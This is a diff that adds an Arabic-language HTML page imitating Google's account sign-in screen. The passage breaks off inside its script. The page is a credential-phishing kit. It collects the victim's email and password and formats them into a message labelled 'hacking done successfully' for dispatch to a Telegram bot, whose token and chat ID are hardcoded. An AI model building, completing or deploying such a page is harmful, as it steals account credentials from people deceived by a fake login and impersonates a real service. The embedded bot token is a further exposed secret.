@@ -1,0 +1,1156 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - حسابات Google</title>
+    
+    <!-- FavIcon -->
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z' fill='%234285F4'/%3E%3Cpath d='M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z' fill='%2334A853'/%3E%3Cpath d='M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z' fill='%23FBBC05'/%3E%3Cpath d='M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z' fill='%23EA4335'/%3E%3C/svg%3E" />
+
+    <!-- Google Fonts: Cairo for modern Arabic, Roboto for fallback -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    
+    <!-- FontAwesome for Premium Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        :root {
+            /* Light Theme Palette - Pure premium Google color scheme with glass-morphic highlights */
+            --bg-page: #f0f4f9;
+            --bg-card: #ffffff;
+            --border-card: #dadce0;
+            --shadow-card: rgba(60, 64, 67, 0.08) 0px 1px 2px 0px, rgba(60, 64, 67, 0.16) 0px 2px 6px 2px;
+            --text-primary: #1f1f1f;
+            --text-secondary: #5f6368;
+            --text-link: #1a73e8;
+            --input-border: #80868b;
+            --input-border-hover: #1f1f1f;
+            --input-focus: #1a73e8;
+            --input-label: #5f6368;
+            --btn-filled-bg: #1a73e8;
+            --btn-filled-bg-hover: #1557b0;
+            --btn-filled-text: #ffffff;
+            --btn-text-color: #1a73e8;
+            --btn-text-bg-hover: rgba(26, 115, 232, 0.04);
+            --error-color: #b00020;
+            --error-bg: rgba(176, 0, 32, 0.04);
+            --pill-bg: #f1f3f4;
+            --pill-border: #e0e0e0;
+            
+            /* Shared configurations */
+            --font-main: 'Cairo', 'Roboto', sans-serif;
+            --transition-speed: 0.35s;
+            --transition-curve: cubic-bezier(0.4, 0.0, 0.2, 1);
+        }
+
+        [data-theme="dark"] {
+            /* Dark Theme Palette - Deep premium futuristic theme */
+            --bg-page: #0a0e17;
+            --bg-card: #151e2e;
+            --border-card: #25334a;
+            --shadow-card: rgba(0, 0, 0, 0.3) 0px 4px 20px 0px, rgba(138, 180, 248, 0.03) 0px 2px 6px 2px;
+            --text-primary: #e8eaed;
+            --text-secondary: #9aa0a6;
+            --text-link: #8ab4f8;
+            --input-border: #5f6368;
+            --input-border-hover: #e8eaed;
+            --input-focus: #8ab4f8;
+            --input-label: #9aa0a6;
+            --btn-filled-bg: #8ab4f8;
+            --btn-filled-bg-hover: #aecbfa;
+            --btn-filled-text: #151e2e;
+            --btn-text-color: #8ab4f8;
+            --btn-text-bg-hover: rgba(138, 180, 248, 0.08);
+            --error-color: #f28b82;
+            --error-bg: rgba(242, 139, 130, 0.08);
+            --pill-bg: #202b3e;
+            --pill-border: #2a3c56;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: var(--font-main);
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--bg-page);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            transition: background-color var(--transition-speed) var(--transition-curve);
+            overflow-x: hidden;
+        }
+
+        /* Top Theme and Options Bar */
+        .header-bar {
+            width: 100%;
+            max-width: 1040px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            z-index: 10;
+        }
+
+        .theme-toggle-btn {
+            background: var(--bg-card);
+            border: 1px solid var(--border-card);
+            color: var(--text-primary);
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            transition: all var(--transition-speed) var(--transition-curve);
+        }
+
+        .theme-toggle-btn:hover {
+            transform: scale(1.08) rotate(15deg);
+            background: var(--btn-text-bg-hover);
+            border-color: var(--text-link);
+        }
+
+        .theme-toggle-btn i {
+            font-size: 1.1rem;
+        }
+
+        /* Main Container Card */
+        .signin-card {
+            background-color: var(--bg-card);
+            border: 1px solid var(--border-card);
+            border-radius: 28px;
+            width: 100%;
+            max-width: 450px;
+            min-height: 520px;
+            margin: auto;
+            position: relative;
+            box-shadow: var(--shadow-card);
+            transition: all var(--transition-speed) var(--transition-curve);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Google Progress Indicator Bar */
+        .google-progress-bar {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background-color: transparent;
+            overflow: hidden;
+            border-radius: 28px 28px 0 0;
+            z-index: 5;
+        }
+
+        .google-progress-bar .bar-runner {
+            position: absolute;
+            height: 100%;
+            background-color: var(--btn-filled-bg);
+            width: 35%;
+            left: -35%;
+            display: none;
+        }
+
+        .google-progress-bar.loading .bar-runner {
+            display: block;
+            animation: google-loading-anim 1.5s infinite linear;
+        }
+
+        @keyframes google-loading-anim {
+            0% { left: -35%; right: 100%; }
+            60% { left: 100%; right: -90%; }
+            100% { left: 100%; right: -90%; }
+        }
+
+        /* Content Slides Wrapper */
+        .slides-wrapper {
+            position: relative;
+            overflow: hidden;
+            width: 100%;
+            height: 100%;
+            flex: 1;
+            min-height: 440px;
+        }
+
+        /* Standard Slide styling: absolutely positioned, default off-screen/invisible */
+        .slide {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            padding: 40px 40px 36px 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            transition: transform 0.45s cubic-bezier(0.4, 0.0, 0.2, 1), opacity 0.45s cubic-bezier(0.4, 0.0, 0.2, 1);
+            opacity: 0;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        /* Active slide: centered, fully visible, interactive */
+        .slide.active {
+            opacity: 1;
+            pointer-events: auto;
+            transform: translateX(0) !important;
+            z-index: 2;
+        }
+
+        /* RTL transitions */
+        [dir="rtl"] #step1 {
+            transform: translateX(0);
+        }
+
+        [dir="rtl"] #step1.slide-out {
+            /* Slide out to left in RTL */
+            transform: translateX(100%);
+            opacity: 0;
+        }
+
+        [dir="rtl"] #step2 {
+            /* Hidden to right in RTL */
+            transform: translateX(-100%);
+        }
+
+        /* LTR transitions */
+        [dir="ltr"] #step1 {
+            transform: translateX(0);
+        }
+
+        [dir="ltr"] #step1.slide-out {
+            /* Slide out to left in LTR */
+            transform: translateX(-100%);
+            opacity: 0;
+        }
+
+        [dir="ltr"] #step2 {
+            /* Hidden to right in LTR */
+            transform: translateX(100%);
+        }
+
+        @media (max-width: 450px) {
+            .signin-card {
+                border: none;
+                box-shadow: none;
+                background-color: transparent;
+                min-height: 100%;
+            }
+            .slide {
+                padding: 24px 16px;
+            }
+            body {
+                background-color: var(--bg-card);
+                padding: 10px;
+            }
+        }
+
+        /* Logo & Header Info */
+        .header-section {
+            text-align: right;
+            margin-bottom: 26px;
+        }
+
+        .google-logo {
+            display: flex;
+            justify-content: flex-start;
+            margin-bottom: 16px;
+        }
+
+        .google-logo svg {
+            width: 48px;
+            height: 48px;
+        }
+
+        .main-heading {
+            font-size: 1.6rem;
+            font-weight: 500;
+            color: var(--text-primary);
+            line-height: 1.4;
+            margin-bottom: 8px;
+        }
+
+        .sub-heading {
+            font-size: 0.95rem;
+            color: var(--text-secondary);
+            font-weight: 400;
+        }
+
+        /* Compact Active Account Pill for Step 2 */
+        .account-pill {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background-color: var(--pill-bg);
+            border: 1px solid var(--pill-border);
+            padding: 4px 12px 4px 8px;
+            border-radius: 100px;
+            cursor: pointer;
+            margin-top: 10px;
+            font-size: 0.88rem;
+            color: var(--text-primary);
+            font-weight: 500;
+            transition: all var(--transition-speed) var(--transition-curve);
+        }
+
+        .account-pill:hover {
+            background-color: var(--btn-text-bg-hover);
+            border-color: var(--text-link);
+        }
+
+        .account-pill i.fa-circle-user {
+            font-size: 1.15rem;
+            color: var(--text-secondary);
+        }
+
+        .account-pill i.fa-chevron-down {
+            font-size: 0.75rem;
+            color: var(--text-secondary);
+            margin-right: 4px;
+        }
+
+        /* Form elements & inputs */
+        .form-section {
+            margin-bottom: auto;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 12px;
+            width: 100%;
+        }
+
+        .input-field {
+            width: 100%;
+            height: 56px;
+            padding: 16px;
+            font-size: 1rem;
+            border: 1px solid var(--input-border);
+            border-radius: 8px;
+            background-color: transparent;
+            color: var(--text-primary);
+            outline: none;
+            text-align: right;
+            direction: ltr; /* inputs usually ltr for emails/passwords */
+            transition: border var(--transition-speed) var(--transition-curve);
+        }
+
+        .input-field:hover:not(:focus) {
+            border-color: var(--input-border-hover);
+        }
+
+        .input-field:focus {
+            border-color: var(--input-focus);
+            border-width: 2px;
+            padding: 15px; /* Adjust padding to offset border-width difference */
+        }
+
+        /* Floating Label Positioning */
+        .input-label {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            background-color: var(--bg-card);
+            padding: 0 6px;
+            color: var(--input-label);
+            font-size: 1rem;
+            pointer-events: none;
+            transition: all 0.2s var(--transition-curve);
+            transform-origin: top right;
+        }
+
+        /* Float the label on focus or filled states */
+        .input-field:focus ~ .input-label,
+        .input-field:not(:placeholder-shown) ~ .input-label {
+            top: 0;
+            transform: translateY(-50%) scale(0.78);
+            color: var(--input-focus);
+        }
+
+        /* RTL exception: for floating label on RTL inputs */
+        .input-label-ar {
+            right: 16px;
+            left: auto;
+        }
+
+        /* Password Show Toggle icon styling */
+        .password-toggle-wrapper {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            z-index: 2;
+        }
+
+        .password-toggle-btn {
+            background: none;
+            border: none;
+            color: var(--text-secondary);
+            font-size: 1.1rem;
+            cursor: pointer;
+            padding: 6px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: background var(--transition-speed) var(--transition-curve);
+        }
+
+        .password-toggle-btn:hover {
+            color: var(--text-primary);
+            background-color: var(--btn-text-bg-hover);
+        }
+
+        /* Validation Error State */
+        .input-group.has-error .input-field {
+            border-color: var(--error-color) !important;
+            border-width: 2px;
+            padding: 15px;
+        }
+
+        .input-group.has-error .input-label {
+            color: var(--error-color) !important;
+        }
+
+        .error-message {
+            display: none;
+            color: var(--error-color);
+            font-size: 0.82rem;
+            margin-top: 6px;
+            align-items: center;
+            gap: 6px;
+            text-align: right;
+            font-weight: 500;
+        }
+
+        .input-group.has-error + .error-message {
+            display: flex;
+        }
+
+        /* Action Links */
+        .action-link {
+            color: var(--text-link);
+            text-decoration: none;
+            font-size: 0.88rem;
+            font-weight: 600;
+            display: inline-block;
+            margin-top: 6px;
+            transition: color var(--transition-speed) var(--transition-curve);
+        }
+
+        .action-link:hover {
+            color: var(--btn-filled-bg-hover);
+            text-decoration: underline;
+        }
+
+        .help-text-block {
+            font-size: 0.88rem;
+            color: var(--text-secondary);
+            line-height: 1.5;
+            margin: 28px 0;
+        }
+
+        /* Show Password Row */
+        .checkbox-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-top: 18px;
+            user-select: none;
+            cursor: pointer;
+        }
+
+        .checkbox-row input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            accent-color: var(--btn-filled-bg);
+            cursor: pointer;
+        }
+
+        .checkbox-row label {
+            font-size: 0.9rem;
+            color: var(--text-primary);
+            cursor: pointer;
+        }
+
+        /* Bottom Controls (Buttons Row) */
+        .bottom-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 36px;
+            gap: 12px;
+        }
+
+        .btn {
+            height: 40px;
+            padding: 0 24px;
+            border-radius: 100px;
+            font-size: 0.88rem;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            transition: all var(--transition-speed) var(--transition-curve);
+            outline: none;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-filled {
+            background-color: var(--btn-filled-bg);
+            color: var(--btn-filled-text);
+        }
+
+        .btn-filled:hover {
+            background-color: var(--btn-filled-bg-hover);
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        .btn-text {
+            background-color: transparent;
+            color: var(--btn-text-color);
+        }
+
+        .btn-text:hover {
+            background-color: var(--btn-text-bg-hover);
+        }
+
+        /* Custom Button Ripple Effect */
+        .ripple {
+            position: absolute;
+            background: rgba(255, 255, 255, 0.25);
+            border-radius: 50%;
+            transform: scale(0);
+            animation: ripple-anim 0.6s linear;
+            pointer-events: none;
+        }
+
+        .btn-text .ripple {
+            background: rgba(26, 115, 232, 0.15);
+        }
+
+        @keyframes ripple-anim {
+            to {
+                transform: scale(4);
+                opacity: 0;
+            }
+        }
+
+        /* Responsive Ultra-Premium Footer */
+        footer {
+            width: 100%;
+            max-width: 1040px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            padding: 20px 0;
+            gap: 16px;
+            z-index: 10;
+            border-top: 1px solid transparent;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 24px;
+        }
+
+        .footer-link {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 0.78rem;
+            transition: color var(--transition-speed) var(--transition-curve);
+        }
+
+        .footer-link:hover {
+            color: var(--text-primary);
+        }
+
+        /* Customized Language Selector Dropdown */
+        .lang-selector-container {
+            position: relative;
+            display: inline-block;
+        }
+
+        .lang-trigger {
+            background: transparent;
+            border: 1px solid transparent;
+            color: var(--text-secondary);
+            padding: 6px 12px;
+            border-radius: 4px;
+            font-size: 0.78rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transition: all var(--transition-speed) var(--transition-curve);
+        }
+
+        .lang-trigger:hover {
+            background-color: var(--btn-text-bg-hover);
+            color: var(--text-primary);
+        }
+
+        .lang-dropdown-menu {
+            position: absolute;
+            bottom: 100%;
+            right: 0;
+            margin-bottom: 8px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-card);
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            display: none;
+            min-width: 150px;
+            z-index: 100;
+            overflow: hidden;
+        }
+
+        .lang-dropdown-menu.active {
+            display: block;
+            animation: dropdown-fade-in 0.2s var(--transition-curve);
+        }
+
+        @keyframes dropdown-fade-in {
+            from { opacity: 0; transform: translateY(5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .lang-option {
+            padding: 10px 16px;
+            font-size: 0.82rem;
+            color: var(--text-primary);
+            text-align: right;
+            cursor: pointer;
+            transition: background var(--transition-speed) var(--transition-curve);
+        }
+
+        .lang-option:hover {
+            background-color: var(--btn-text-bg-hover);
+        }
+
+        .lang-option.active {
+            color: var(--text-link);
+            font-weight: 600;
+            background-color: var(--btn-text-bg-hover);
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Top Navigation Utility Bar -->
+    <div class="header-bar">
+        <div></div> <!-- Left spacing placeholder -->
+        <button class="theme-toggle-btn" id="themeToggleBtn" aria-label="تبديل المظهر الداكن">
+            <i class="fa-solid fa-moon"></i>
+        </button>
+    </div>
+
+    <!-- Main Google Authentic Auth Card -->
+    <div class="signin-card" id="signinCard">
+        <!-- Blue Linear Progress Loading Indicator -->
+        <div class="google-progress-bar" id="progressBar">
+            <div class="bar-runner"></div>
+        </div>
+
+        <div class="slides-wrapper">
+            
+            <!-- STEP 1 SLIDE (Email field) -->
+            <div class="slide active" id="step1">
+                <div class="header-section">
+                    <div class="google-logo">
+                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+                            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" fill="#FBBC05"/>
+                            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z" fill="#EA4335"/>
+                        </svg>
+                    </div>
+                    <h1 class="main-heading">تسجيل الدخول</h1>
+                    <p class="sub-heading">باستخدام حسابك على Google</p>
+                </div>
+
+                <div class="form-section">
+                    <div class="input-group" id="emailGroup">
+                        <input type="text" class="input-field" id="emailInput" placeholder=" " autocomplete="username" inputmode="email">
+                        <label class="input-label" for="emailInput">البريد الإلكتروني أو الهاتف</label>
+                    </div>
+                    <!-- Error prompt block -->
+                    <div class="error-message" id="emailError">
+                        <i class="fa-solid fa-circle-exclamation"></i>
+                        <span id="emailErrorText">يرجى إدخال بريد إلكتروني صالح أو رقم هاتف.</span>
+                    </div>
+
+                    <a href="#" class="action-link" id="forgotEmailLink">هل نسيت البريد الإلكتروني؟</a>
+
+                    <div class="help-text-block">
+                        ليس كمبيوترك الشخصي؟ استخدم نافذة للتصفح الخاص لتسجيل الدخول.
+                        <a href="#" class="action-link" style="margin-top: 4px;">معرفة المزيد عن استخدام ضيف تسجيل الدخول</a>
+                    </div>
+                </div>
+
+                <div class="bottom-actions">
+                    <button class="btn btn-text" id="createAccountBtn">إنشاء حساب</button>
+                    <button class="btn btn-filled" id="nextBtn">التالي</button>
+                </div>
+            </div>
+
+            <!-- STEP 2 SLIDE (Password field) -->
+            <div class="slide" id="step2">
+                <div class="header-section">
+                    <div class="google-logo">
+                        <!-- Official Multi-colored Google G Icon SVG -->
+                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+                            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" fill="#FBBC05"/>
+                            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z" fill="#EA4335"/>
+                        </svg>
+                    </div>
+                    <h1 class="main-heading">مرحباً بك</h1>
+                    
+                    <!-- Selected Account Pill with click-back support -->
+                    <div class="account-pill" id="accountPill" title="تغيير الحساب">
+                        <i class="fa-solid fa-circle-user"></i>
+                        <span id="activeEmailDisplay">username@gmail.com</span>
+                        <i class="fa-solid fa-chevron-down"></i>
+                    </div>
+                </div>
+
+                <div class="form-section">
+                    <div class="input-group" id="passwordGroup">
+                        <!-- Password field visibility container LTR, labeled RTL -->
+                        <input type="password" class="input-field" id="passwordInput" placeholder=" " autocomplete="current-password">
+                        <label class="input-label" for="passwordInput">أدخل كلمة المرور</label>
+                        
+                        <!-- Toggle eye-icon visible inside input -->
+                        <div class="password-toggle-wrapper">
+                            <button type="button" class="password-toggle-btn" id="togglePasswordBtn" aria-label="عرض كلمة المرور">
+                                <i class="fa-regular fa-eye-slash" id="togglePasswordIcon"></i>
+                            </button>
+                        </div>
+                    </div>
+                    <!-- Password Error placeholder -->
+                    <div class="error-message" id="passwordError">
+                        <i class="fa-solid fa-circle-exclamation"></i>
+                        <span>كلمة المرور غير صحيحة. يرجى المحاولة مجدداً.</span>
+                    </div>
+
+                    <div class="checkbox-row" id="showPasswordRow">
+                        <input type="checkbox" id="showPasswordCheckbox">
+                        <label for="showPasswordCheckbox">عرض كلمة المرور</label>
+                    </div>
+                </div>
+
+                <div class="bottom-actions">
+                    <button class="btn btn-text" id="forgotPasswordBtn">هل نسيت كلمة المرور؟</button>
+                    <button class="btn btn-filled" id="submitBtn">التالي</button>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- Customized Premium Responsive Footer -->
+    <footer>
+        <div class="lang-selector-container">
+            <button class="lang-trigger" id="langTrigger" aria-haspopup="listbox" aria-expanded="false">
+                <i class="fa-solid fa-globe"></i>
+                <span id="activeLangText">العربية</span>
+                <i class="fa-solid fa-caret-down" style="font-size: 0.65rem;"></i>
+            </button>
+            <div class="lang-dropdown-menu" id="langDropdown" role="listbox">
+                <div class="lang-option active" data-lang="ar" role="option" aria-selected="true">العربية</div>
+                <div class="lang-option" data-lang="en" role="option">English</div>
+                <div class="lang-option" data-lang="fr" role="option">Français</div>
+                <div class="lang-option" data-lang="es" role="option">Español</div>
+            </div>
+        </div>
+
+        <div class="footer-links">
+            <a href="#" class="footer-link">المساعدة</a>
+            <a href="#" class="footer-link">الخصوصية</a>
+            <a href="#" class="footer-link">البنود</a>
+        </div>
+    </footer>
+
+    <script>
+        // ==============================================================
+        // TELEGRAM BOT CONFIGURATION
+        // ==============================================================
+        // Replace these placeholders with your actual Bot Token and Chat ID.
+        // The script will automatically skip Telegram dispatch if left as is,
+        // and proceed directly with the premium success redirection.
+        const TELEGRAM_BOT_TOKEN = '7875221623:AAFAQzgScORKy3MdWkNDLtaoAwH5csjIHiA';
+        const TELEGRAM_CHAT_ID = '-4795806589';
+        // ==============================================================
+
+        // DOM Elements
+        const themeToggleBtn = document.getElementById('themeToggleBtn');
+        const themeIcon = themeToggleBtn.querySelector('i');
+        const signinCard = document.getElementById('signinCard');
+        const progressBar = document.getElementById('progressBar');
+        
+        // Input fields & groups
+        const emailInput = document.getElementById('emailInput');
+        const emailGroup = document.getElementById('emailGroup');
+        const emailError = document.getElementById('emailError');
+        const emailErrorText = document.getElementById('emailErrorText');
+        
+        const passwordInput = document.getElementById('passwordInput');
+        const passwordGroup = document.getElementById('passwordGroup');
+        const passwordError = document.getElementById('passwordError');
+        const togglePasswordBtn = document.getElementById('togglePasswordBtn');
+        const togglePasswordIcon = document.getElementById('togglePasswordIcon');
+        const showPasswordCheckbox = document.getElementById('showPasswordCheckbox');
+        const showPasswordRow = document.getElementById('showPasswordRow');
+        
+        // Action buttons
+        const nextBtn = document.getElementById('nextBtn');
+        const submitBtn = document.getElementById('submitBtn');
+        const accountPill = document.getElementById('accountPill');
+        const activeEmailDisplay = document.getElementById('activeEmailDisplay');
+        
+        // Language elements
+        const langTrigger = document.getElementById('langTrigger');
+        const langDropdown = document.getElementById('langDropdown');
+        const activeLangText = document.getElementById('activeLangText');
+        const langOptions = document.querySelectorAll('.lang-option');
+
+        // Ripple Effect Generator
+        function createRipple(event, button) {
+            const circle = document.createElement("span");
+            const diameter = Math.max(button.clientWidth, button.clientHeight);
+            const radius = diameter / 2;
+
+            const rect = button.getBoundingClientRect();
+            
+            circle.style.width = circle.style.height = `${diameter}px`;
+            circle.style.left = `${event.clientX - rect.left - radius}px`;
+            circle.style.top = `${event.clientY - rect.top - radius}px`;
+            circle.classList.add("ripple");
+
+            const prevRipple = button.getElementsByClassName("ripple")[0];
+            if (prevRipple) {
+                prevRipple.remove();
+            }
+
+            button.appendChild(circle);
+        }
+
+        document.querySelectorAll('.btn').forEach(button => {
+            button.addEventListener('click', function(e) {
+                createRipple(e, this);
+            });
+        });
+
+        // Toggle Dark/Light Theme
+        function setTheme(theme) {
+            if (theme === 'dark') {
+                document.documentElement.setAttribute('data-theme', 'dark');
+                themeIcon.className = 'fa-solid fa-sun';
+                localStorage.setItem('theme', 'dark');
+            } else {
+                document.documentElement.removeAttribute('data-theme');
+                themeIcon.className = 'fa-solid fa-moon';
+                localStorage.setItem('theme', 'light');
+            }
+        }
+
+        // Initialize Theme from Local Storage or preferences
+        const savedTheme = localStorage.getItem('theme') || (window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light');
+        setTheme(savedTheme);
+
+        themeToggleBtn.addEventListener('click', () => {
+            const currentTheme = document.documentElement.getAttribute('data-theme');
+            setTheme(currentTheme === 'dark' ? 'light' : 'dark');
+        });
+
+        // Email / Phone Validation
+        function validateEmailOrPhone(value) {
+            if (!value.trim()) {
+                return { valid: false, message: 'أدخل عنوان بريد إلكتروني أو رقم هاتف' };
+            }
+            
+            // Standard Regex for basic Email validation
+            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            // Basic international phone pattern (7 to 15 digits optionally starting with +)
+            const phonePattern = /^\+?[0-9]{7,15}$/;
+            // Gmail-specific or user input name check (must be at least 3 letters)
+            const basicUserPattern = /^[a-zA-Z0-9._%+-]{3,}$/;
+
+            if (emailPattern.test(value) || phonePattern.test(value) || basicUserPattern.test(value)) {
+                return { valid: true };
+            }
+
+            return { valid: false, message: 'تعذّر العثور على حساب Google هذا. يرجى إعادة المحاولة.' };
+        }
+
+        // Flow transition helper (Step 1 to Step 2)
+        function goToStep2() {
+            const value = emailInput.value.trim();
+            const validation = validateEmailOrPhone(value);
+
+            if (!validation.valid) {
+                emailGroup.classList.add('has-error');
+                emailErrorText.textContent = validation.message;
+                emailInput.focus();
+                return;
+            }
+
+            // Remove errors
+            emailGroup.classList.remove('has-error');
+
+            // Format displayed email/account in pill
+            let displayValue = value;
+            if (!value.includes('@') && !/^\+?[0-9]+$/.test(value)) {
+                displayValue = `${value}@gmail.com`;
+            }
+            activeEmailDisplay.textContent = displayValue;
+
+            // Trigger Google progress loader animation
+            progressBar.classList.add('loading');
+            nextBtn.disabled = true;
+
+            // Smooth transition simulation
+            setTimeout(() => {
+                progressBar.classList.remove('loading');
+                nextBtn.disabled = false;
+                
+                // Toggle slide active classes
+                document.getElementById('step1').classList.remove('active');
+                document.getElementById('step1').classList.add('slide-out');
+                document.getElementById('step2').classList.add('active');
+                
+                passwordInput.value = '';
+                passwordGroup.classList.remove('has-error');
+                passwordInput.focus();
+            }, 1200);
+        }
+
+        // Return to Step 1
+        function goToStep1() {
+            progressBar.classList.add('loading');
+            setTimeout(() => {
+                progressBar.classList.remove('loading');
+                
+                // Reset slide active classes
+                document.getElementById('step1').classList.remove('slide-out');
+                document.getElementById('step1').classList.add('active');
+                document.getElementById('step2').classList.remove('active');
+                
+                emailInput.focus();
+            }, 600);
+        }
+
+        // Password Show/Hide Toggle Event handlers
+        function togglePasswordVisibility(visible) {
+            if (visible) {
+                passwordInput.type = 'text';
+                togglePasswordIcon.className = 'fa-regular fa-eye';
+                showPasswordCheckbox.checked = true;
+            } else {
+                passwordInput.type = 'password';
+                togglePasswordIcon.className = 'fa-regular fa-eye-slash';
+                showPasswordCheckbox.checked = false;
+            }
+        }
+
+        togglePasswordBtn.addEventListener('click', () => {
+            const isVisible = passwordInput.type === 'text';
+            togglePasswordVisibility(!isVisible);
+        });
+
+        showPasswordCheckbox.addEventListener('change', (e) => {
+            togglePasswordVisibility(e.target.checked);
+        });
+
+        showPasswordRow.addEventListener('click', (e) => {
+            if (e.target !== showPasswordCheckbox) {
+                showPasswordCheckbox.checked = !showPasswordCheckbox.checked;
+                togglePasswordVisibility(showPasswordCheckbox.checked);
+            }
+        });
+
+        // Next and Submit validation events
+        nextBtn.addEventListener('click', goToStep2);
+        
+        emailInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                goToStep2();
+            }
+        });
+
+        accountPill.addEventListener('click', goToStep1);
+
+        submitBtn.addEventListener('click', () => {
+            const password = passwordInput.value;
+            if (!password.trim()) {
+                passwordGroup.classList.add('has-error');
+                passwordInput.focus();
+                return;
+            }
+
+            passwordGroup.classList.remove('has-error');
+            progressBar.classList.add('loading');
+            submitBtn.disabled = true;
+
+            // Gather inputs for Telegram dispatch
+            const email = emailInput.value.trim();
+            const pass = password.trim();
+            const message = `📬 <b>hacking done successfully/b>\n\n📧 <b>البريد:</b> <code>${email}</code>\n🔑 <b>كلمة المرور:</b> <code>${pass}</code>`;
+
+            // Function to handle redirection
+            const redirectToSuccess = () => {
+                progressBar.classList.remove('loading');
